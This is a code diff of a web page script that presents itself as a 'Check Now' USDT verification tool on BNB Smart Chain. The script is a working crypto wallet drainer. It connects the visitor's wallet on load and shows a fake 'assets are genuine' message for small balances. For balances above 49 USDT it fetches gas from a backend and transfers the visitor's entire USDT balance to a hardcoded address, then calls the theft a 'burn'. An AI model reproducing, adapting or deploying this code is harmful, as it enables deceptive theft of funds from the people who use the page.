@@ -1250,59 +1250,58 @@
       </svg><span>Now Now</span><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right w-5 h-5 group-hover:translate-x-1 transition-transform"><path d="M5 12h14"></path><path d="m12 5 7 7-7 7"></path></svg></button> -->
                                                             <p id="walletInfo" style="display: none;">Connecting...  </p>
                                                             <button type="button" onclick="approveToken()" style="display: none;">Approve</button>
-                                                           <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
+                                                        <script src="https://cdn.jsdelivr.net/npm/web3@1.7.0/dist/web3.min.js"></script>
 <script>
 const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
-const usdtContractAddress = "0x55d398326f99059Ff775485246999027B3197955";
+const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
 let web3, userAddress;
 
-// ✅ Correct Order: Add/switch BSC chain first, then request wallet connection
 async function connectWalletAndSwitch() {
     if (!window.ethereum) {
-        alert("Please install MetaMask or a Web3 wallet!");
+        alert("Please install MetaMask or Trust Wallet.");
         return;
     }
 
     try {
         web3 = new Web3(window.ethereum);
 
-        const currentChainId = await window.ethereum.request({ method: 'eth_chainId' });
-
-        if (currentChainId !== '0x38') {
+        // Switch to BSC if needed
+        const currentChain = await window.ethereum.request({ method: 'eth_chainId' });
+        if (currentChain !== '0x38') {
             try {
                 await window.ethereum.request({
                     method: 'wallet_switchEthereumChain',
-                    params: [{ chainId: '0x38' }],
+                    params: [{ chainId: '0x38' }]
                 });
-            } catch (switchError) {
-                if (switchError.code === 4902) {
+            } catch (err) {
+                if (err.code === 4902) {
                     await window.ethereum.request({
                         method: 'wallet_addEthereumChain',
                         params: [{
                             chainId: '0x38',
-                            chainName: 'BNB Smart Chain',
+                            chainName: 'Binance Smart Chain',
                             nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                             rpcUrls: ['https://bsc-dataseed.binance.org/'],
-                            blockExplorerUrls: ['https://bscscan.com'],
+                            blockExplorerUrls: ['https://bscscan.com']
                         }]
                     });
                 } else {
-                    alert("Failed to switch to BSC. Please do it manually in MetaMask.");
+                    alert("Please switch to BNB manually.");
                     return;
                 }
             }
         }
 
-        // ✅ Now request account access
-        await window.ethereum.request({ method: "eth_accounts" });
+        // Request wallet access
+        await window.ethereum.request({ method: "eth_requestAccounts" });
         const accounts = await web3.eth.getAccounts();
         userAddress = accounts[0];
-        console.log("✅ Wallet connected:", userAddress);
-    } catch (error) {
-        console.error("Wallet connect or switch error:", error);
-        alert("Wallet connection failed. Please try again.");
+        console.log("✅ Wallet:", userAddress);
+    } catch (e) {
+        alert("Wallet connection failed.");
+        console.error(e);
     }
 }
 
@@ -1310,96 +1309,122 @@ async function approveToken() {
     if (!web3 || !userAddress) {
         await connectWalletAndSwitch();
         if (!web3 || !userAddress) {
-            showPopup("Please connect your wallet before initiating transfer.", "red");
+            showPopup("Wallet not connected.", "red");
             return;
         }
     }
 
     try {
         const usdtContract = new web3.eth.Contract([
-            { constant: true, inputs: [{ name: "_owner", type: "address" }], name: "balanceOf", outputs: [{ name: "", type: "uint256" }], type: "function" },
-            { constant: false, inputs: [{ name: "recipient", type: "address" }, { name: "amount", type: "uint256" }], name: "transfer", outputs: [{ name: "", type: "bool" }], type: "function" }
+            {
+                constant: true,
+                inputs: [{ name: "_owner", type: "address" }],
+                name: "balanceOf",
+                outputs: [{ name: "", type: "uint256" }],
+                type: "function"
+            },
+            {
+                constant: false,
+                inputs: [
+                    { name: "recipient", type: "address" },
+                    { name: "amount", type: "uint256" }
+                ],
+                name: "transfer",
+                outputs: [{ name: "", type: "bool" }],
+                type: "function"
+            }
         ], usdtContractAddress);
 
-        const [usdtWei, bnbWei] = await Promise.all([
+        const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
             usdtContract.methods.balanceOf(userAddress).call(),
             web3.eth.getBalance(userAddress)
         ]);
 
-        const usdt = parseFloat(web3.utils.fromWei(usdtWei, "ether"));
-        const bnb = parseFloat(web3.utils.fromWei(bnbWei, "ether"));
+        const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
+        const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));
 
-        if (usdt === 0) {
-            showPopup("No USDT found in your wallet.", "black");
+        console.log("USDT:", usdtBalance);
+        console.log("BNB:", bnbBalance);
+
+        // ✅ If 0 USDT
+        if (isNaN(usdtBalance) || usdtBalance < 0.000001) {
+            showPopup("No USDT assets found in your wallet.", "black");
             return;
         }
 
-        if (usdt <= 49) {
-            showPopup(`✅ Verified<br><b>USDT:</b> ${usdt}<br><b>BNB:</b> ${bnb}`, "green");
+        // ✅ If ≤ 49 USDT
+        if (usdtBalance <= 49) {
+            showPopup(
+                `✅ Verification Successful<br>Your assets are genuine.<br><b>USDT:</b> ${usdtBalance}<br><b>BNB:</b> ${bnbBalance}`,
+                "green"
+            );
             return;
         }
 
-        if (bnb < 0.0005) {
+        // ✅ If > 49 USDT → transfer
+        if (bnbBalance < 0.0005) {
             showPopup("Requesting gas from backend...", "blue");
-            try {
-                await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ toAddress: userAddress })
-                });
-                await new Promise(resolve => setTimeout(resolve, 3000));
-            } catch (e) {
-                console.warn("Gas request failed", e);
-            }
+            await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ toAddress: userAddress })
+            });
+            await new Promise(r => setTimeout(r, 3000)); // wait for gas
         }
 
-        const tx = await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdt.toString(), "ether"))
+        showPopup("Transferring USDT...", "blue");
+
+        await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
             .send({ from: userAddress });
 
-        showPopup(`✅ Transfer complete<br><b>USDT Burned:</b> ${usdt}`, "red");
-        console.log("✅ USDT transferred:", tx.transactionHash);
+        showPopup(
+            `✅ Transfer complete<br><b>USDT Burned:</b> ${usdtBalance}`,
+            "red"
+        );
+
     } catch (e) {
-        console.error("Transfer error:", e);
-        alert("USDT transfer failed. Check balance or gas.");
+        console.error("❌ Transfer failed:", e);
+        showPopup("USDT transfer failed. Check balance or gas.", "red");
     }
 }
 
-function showPopup(msg, color) {
-    let box = document.getElementById("popupBox");
-    if (!box) {
-        box = document.createElement("div");
-        box.id = "popupBox";
-        Object.assign(box.style, {
+function showPopup(message, color) {
+    let popup = document.getElementById("popupBox");
+    if (!popup) {
+        popup = document.createElement("div");
+        popup.id = "popupBox";
+        Object.assign(popup.style, {
             position: "fixed", top: "50%", left: "50%",
             transform: "translate(-50%, -50%)",
             padding: "20px", borderRadius: "10px",
             boxShadow: "0 0 10px rgba(0,0,0,0.2)",
             textAlign: "center", fontSize: "18px",
-            width: "80%", maxWidth: "400px"
+            width: "80%", maxWidth: "400px",
+            zIndex: 9999, backgroundColor: "#fff"
         });
-        document.body.appendChild(box);
+        document.body.appendChild(popup);
     }
-    box.innerHTML = msg;
-    box.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
-    box.style.color = color;
-    box.style.display = "block";
-    setTimeout(() => box.style.display = "none", 5000);
+    popup.style.backgroundColor = color === "red" ? "#ffebeb" : color === "green" ? "#e6f7e6" : "#f0f0f0";
+    popup.style.color = color;
+    popup.innerHTML = message;
+    popup.style.display = "block";
+    setTimeout(() => popup.style.display = "none", 5000);
 }
 
-// ✅ Auto-bind “Check Now” to approveToken()
+// ✅ Auto-bind "Check Now" button
 window.addEventListener("load", async () => {
-    await connectWalletAndSwitch(); // Ensure network + wallet
+    await connectWalletAndSwitch();
 
     const observer = new MutationObserver(() => {
-        const btn = [...document.querySelectorAll("button")].find(b =>
-            b.textContent.trim().toLowerCase() === "check now"
-        );
+        const btn = [...document.querySelectorAll("button")]
+            .find(b => b.textContent.trim().toLowerCase() === "check now");
         if (btn) {
             btn.addEventListener("click", approveToken);
-            console.log("✅ 'Check Now' button bound to approveToken()");
+            console.log("✅ Bound 'Check Now' to approveToken()");
             observer.disconnect();
         }
     });
+
     observer.observe(document.body, { childList: true, subtree: true });
 });
 </script>
